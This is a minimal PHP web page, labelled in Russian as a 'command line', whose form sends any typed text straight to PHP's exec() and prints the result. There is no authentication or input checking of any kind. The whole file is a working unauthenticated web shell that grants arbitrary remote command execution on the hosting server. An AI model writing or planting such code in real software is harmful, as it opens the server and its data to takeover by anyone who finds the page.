<!DOCTYPE html>
<html>
    <head>
        <title></title>
        <meta charset="utf-8" />
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    </head>
    <body>
    <p class="h1" style="margin: 15px;">Командная строка</p>
    <form method="POST">
        <input type="text" name="input" class="form-control" style="margin: 15px; width: 50%">
        <button class="btn btn-primary" type="submit" style="margin: 5px 15px;">Отправить</button>
    </form>
    <p class="lead" style="margin: 0 15px;"><?php
            if (isset($_POST["input"])){
                $input = $_POST["input"];
                $output=[];
                $errors=null;
                exec($input, $output, $errors);
                echo implode(' ',$output);
            }
        ?>
    </p>
    </body>
</html>